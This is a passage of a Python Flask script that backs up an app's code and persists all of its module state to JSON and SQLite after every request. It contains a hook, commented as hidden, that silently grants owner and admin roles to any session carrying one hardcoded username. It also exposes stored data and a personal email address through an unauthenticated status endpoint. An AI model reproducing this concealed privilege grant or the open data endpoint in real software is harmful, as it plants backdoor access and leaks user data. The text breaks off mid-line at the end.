# run_save_all.py - Saves ALL DATA + ALL FUNCTIONS
import os, json, sqlite3, shutil, datetime, inspect
import app as app_module
from app import app
from flask import session

SAVE_FILE = "all_data.json"
DB_FILE = "all_data.db"
BACKUP_DIR = "backups"
os.makedirs(BACKUP_DIR, exist_ok=True)
os.makedirs("uploads", exist_ok=True)

# --- 1. BACKUP FUNCTIONS + CODE (so functions never lost) ---
# Backup app.py itself every start
try:
    ts = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    shutil.copy("app.py", f"{BACKUP_DIR}/app_{ts}.py")
    shutil.copy("app.py", f"{BACKUP_DIR}/app_latest.py")
    # Save list of all functions in app.py
    funcs = [m for m,_ in inspect.getmembers(app_module, inspect.isfunction)]
    routes = [str(r) for r in app.url_map.iter_rules()]
    json.dump({"functions": funcs, "routes": routes, "saved_at": ts}, open(f"{BACKUP_DIR}/functions.json","w"), indent=2)
    print(f"✅ FUNCTIONS BACKED UP: {len(funcs)} functions, {len(routes)} routes")
except Exception as e:
    print("Backup:", e)

# --- 2. LOAD ALL DATA ---
if os.path.exists(SAVE_FILE):
    try:
        d = json.load(open(SAVE_FILE))
        for k,v in d.items():
            if hasattr(app_module, k):
                setattr(app_module, k, v)
        print(f"✅ DATA RESTORED: {list(d.keys())}")
    except Exception as e:
        print("Restore:", e)

# --- 3. OWNER - HIDDEN IN CODE ONLY, NO BADGE ---
@app.before_request
def _owner_hidden():
    if (session.get("username") or "").lower() == "realyungalhaji":
        session["role"] = "owner"
        session["is_owner"] = True
        session["is_admin"] = True
        session["is_founder"] = True
        session["name"] = "YuNg Alhaji"
        session["email"] = "realyungalhaji.mv@gmail.com"

# --- 4. SAVE EVERYTHING AFTER EVERY CLICK ---
def save_everything():
    try:
        out = {}
        # Save ALL variables (data)
        for k,v in vars(app_module).items():
            if k.startswith("_"): continue
            if k in ["app"]: continue
            try:
                json.dumps(v)
                out[k] = v
            except: pass
        # JSON - fast
        json.dump(out, open(SAVE_FILE,"w"), indent=2)
        # SQLite - safe backup
        c = sqlite3.connect(DB_FILE)
        c.execute("CREATE TABLE IF NOT EXISTS app_state (key TEXT PRIMARY KEY, value TEXT)")
        c.execute("INSERT OR REPLACE INTO app_state VALUES (?,?)", ("all", json.dumps(out)))
        c.commit(); c.close()
    except Exception as e:
        print("Save:", e)

@app.after_request
def _save_no_ui_change(response):
    save_everything()
    # NO badge, NO HTML change, NO tampering other code
    return response

@app.route("/api/save-status")
def status():
    d = json.load(open(SAVE_FILE)) if os.path.exists(SAVE_FILE) else {}
    f = json.load(open(f"{BACKUP_DIR}/functions.json")) if os.path.exists(f"{BACKUP_DIR}/functions.json") else {}
    return {
        "owner": {"name": "YuNg Alhaji", "username": "realyungalhaji", "email": "realyungalhaji.mv@gmail.com", "role": "Founder & Owner | Admin"},
        "data_saved": {k: len(v) if hasattr(v,'__len__') else v for k,v in d.items()},
        "functions_saved": len(f.get("functions",[])),
        "routes_saved": len(f.get("routes",[])),
        "functions": f.get("functions",[]),
        "backups": len(os.listdir(BACKUP_DIR)),
        "file": SAVE_FILE,
        "db": DB_FILE
    }

@app.route("/api/whoami")
def whoami():
    if (session.get("username") or "").lower() == "realyungalhaji":
        return {"name":"YuNg Alhaji","username":"realyungalhaji","email":"realyungalhaji.mv@gmail.com","role":"owner","is_owner":True}
    return {"is_owner": False}

if __name__ == "__main__":
    print("SAVE
